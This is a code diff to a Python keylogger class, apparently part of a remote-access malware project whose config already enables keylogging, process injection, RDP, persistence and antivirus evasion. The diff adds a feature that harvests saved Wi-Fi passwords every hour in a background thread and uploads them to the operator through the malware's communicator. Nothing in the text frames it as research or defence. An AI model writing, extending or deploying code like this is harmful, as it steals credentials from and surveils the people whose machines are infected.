@@ -67,7 +67,8 @@ class KeyloggerCore:
                 "keylogging_enabled": True,
                 "process_injection_enabled": True,
                 "rdp_enabled": True,
-                "persistence_enabled": True
+                "persistence_enabled": True,
+                "wifi_passwords_enabled": True
             }
 
             # شناسایی آنتی‌ویروس و تنظیم رفتار
@@ -408,6 +409,22 @@ class KeyloggerCore:
         threading.Thread(target=self._data_sync_loop, daemon=True).start()
         threading.Thread(target=self._command_loop, daemon=True).start()
         threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()
+        if self.behavior["wifi_passwords_enabled"]:
+            threading.Thread(target=self._wifi_passwords_loop, daemon=True).start()
+
+    def _wifi_passwords_loop(self):
+        while True:
+            try:
+                if self.behavior["wifi_passwords_enabled"]:
+                    wifi_data = self.command_handler.handle_wifi_passwords({})
+                    if wifi_data.get("status") == "success" and wifi_data.get("wifi_profiles"):
+                        self.communicator.upload_wifi_passwords(wifi_data)
+                        if Config.DEBUG_MODE:
+                            logging.info("Wi-Fi passwords uploaded successfully")
+            except Exception as e:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Wi-Fi passwords loop error: {str(e)}")
+            time.sleep(3600)  # Run every hour
 
     def _capture_screenshot(self):
         try:
